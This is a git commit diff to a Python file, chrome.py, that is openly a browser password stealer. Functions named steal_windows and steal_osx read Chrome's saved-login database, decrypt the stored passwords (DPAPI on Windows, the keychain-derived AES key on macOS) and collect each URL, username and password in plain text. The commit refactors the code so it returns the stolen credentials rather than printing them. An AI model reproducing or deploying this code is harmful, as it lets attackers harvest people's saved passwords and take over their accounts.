54a246e947e4061dba481abd822ef2f98698d36f
Zvonimir Rudinski <zvonimirurdinski@protonmail.ch>
2017-12-17 23:29:00 +0100

    fixed chrome

--- chrome.py
+++ chrome.py
@@ -1,23 +1,22 @@
+# Common imports
 import platform
-#windows imports
+import sqlite3
+import os
+# Windows imports
 if platform.system() == "Windows":
-	import os
-	import sqlite3
 	import win32crypt
 	import sys
-#osx imports
+# OSX imports
 elif platform.system() == 'Darwin':
-	import sqlite3
-	from os import path
 	import binascii
 	import subprocess
 	import base64
 	from hashlib import pbkdf2_hmac
 
-def queryDB(DBpath):
+def query_db(db_path):
 	# Try to open the SQLite3 database
 	try:
-		conn = sqlite3.connect(DBpath)
+		conn = sqlite3.connect(db_path)
 		cursor = conn.cursor()
 	except:
 		return ('[-] Couldn\'t open the database')
@@ -30,19 +29,19 @@ def queryDB(DBpath):
 	return cursor.fetchall()
 
 def steal():
-	# Do only if on Windows, Linux and Mac support will be added later
+	# Do only if on Windows or Mac, Linux support will be added later
 	if platform.system() == "Windows":
-		steal_windows()
+		return steal_windows()
 	elif platform.system()=='Darwin':
-		steal_osx()
-	else:
-		print("[-] "+platform.system()+"is not a supported OS")
-
+		return steal_osx()
+	return("[-] "+platform.system()+"is not supported.")
+# OSX part
 def steal_osx():
-	#get the passwords
-	data = queryDB(path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data'))
-
-	#get encrpytion key from keychain
+	# Recovered list
+	recovered = list()
+	# Get the passwords
+	data = query_db(os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Login Data'))
+	# Get the encrpytion key from the keychain
 	safe_storage_key = subprocess.Popen(
 		"security find-generic-password -wa "
 		"'Chrome'",
@@ -51,57 +50,64 @@ def steal_osx():
 		shell=True)
 	stdout, stderr = safe_storage_key.communicate()
 	safe_storage_key = stdout.replace("\n", "")
-
-
-	#catch keychain errors
+	# Catch keychain errors
 	if stderr:
-		print("Error: Chrome entry not found in keychain?".format(stderr))
-		return
+		return("[-]Chrome entry not found in keychain.")
 	if not stdout:
-		print("User clicked deny.")
-
-	#Loop through the passwords
+		return("[-]You clicked deny.")
+	# Are there any passwords?
 	if len(data) > 0:
+		# Loop through the passwords
 		for result in data:
-	  		#Setup initialisation vector
+	  		#Setup the initialisation vector
 	  		iv = ''.join(('20', ) * 16)
 
-			#setup decryption key
+			# Setup the decryption key
 			key = pbkdf2_hmac('sha1', safe_storage_key, b'saltysalt', 1003)[:16]
 			hex_key = binascii.hexlify(key)
 
-			#decrpyt password with key
+			# Decrpyt the password with the key
 			hex_enc_password = base64.b64encode(result[2][3:])
 
-		    # send any error messages to /dev/null to prevent screen bloating up
-		    # (any decryption errors will give a non-zero exit, causing exception)
+			# Send any error messages to /dev/null to prevent screen bloating up
+			# (any decryption errors will give a non-zero exit, causing exception)
 			try:
 				if hex_enc_password:
-					#decrpyt with openssl
+					# Decrpyt with OpenSSL
 					password = subprocess.check_output(
 						"openssl enc -base64 -d "
 						"-aes-128-cbc -iv '"+iv+"' -K "+hex_key+" <<< "+
 						hex_enc_password+" 2>/dev/null",
 						shell=True)
-					print "[+] URL:{url}\nUsername:{user}\nPassword:{pass_}\n".format(url=result[0],user=result[1],pass_=password)
+					# If the URL is blank,print it as (Unknown)
+					if(len(result[0]) <= 0):
+						result[0] = "(Unknown)"
+					# If the username is blank,say so
+					if(len(result[1]) <= 0):
+						result[1] = "(Blank)"
+					# If the password is blank,say so
+					if(len(password) <= 0):
+						password = "(Blank)"
+					recovered.append("[+] URL:{url}\nUsername:{user}\nPassword:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
 			except subprocess.CalledProcessError:
-				password = "Error decrypting this data"
-		return
+				pass
+		return recovered
 	else:
-		print '[-] There are no passwords'
-		return
+		# There are no saved passwords
+		return('[-] There are no saved passwords')
 
-
+# Windows part
 def steal_windows():
-	# Chrome keeps passwords in the %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
-	data = queryDB(os.getenv('LOCALAPPDATA')  + '\\Google\\Chrome\\User Data\\Default\\Login Data')
-
+	# Recovered list
+	recovered = list()
+	# Get the passwords
+	data = query_db(os.getenv('LOCALAPPDATA')  + '\\Google\\Chrome\\User Data\\Default\\Login Data')
 	# Check if there is any data
 	if len(data) > 0:
 		for result in data:
-		# Decrypt the Password
+			# Decrypt the Password
 			try:
-			# The good/bad thing about the Chrome passwords is that they are easily decryptable
+				# The good/bad thing about the Chrome passwords is that they are easily decryptable
 				password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
 			except:
 				# If it fails no biggie try another one
@@ -111,8 +117,15 @@ def steal_windows():
 				# If the URL is blank,print it as (Unknown)
 				if(len(result[0]) <= 0):
 					result[0] = "(Unknown)"
-				# Print the result
-				ret.append ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
-		return ret
+				# If the username is blank,say so
+				if(len(result[1]) <= 0):
+					result[1] = "(Blank)"
+				# If the password is blank,say so
+				if(len(password) <= 0):
+					password = "(Blank)"
+				# Append the result
+				recovered.append ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
+		return recovered
 	else:
-		return ('[-] There are no passwords')
+		# There are no saved passwords
+		return('[-] There are no saved passwords')
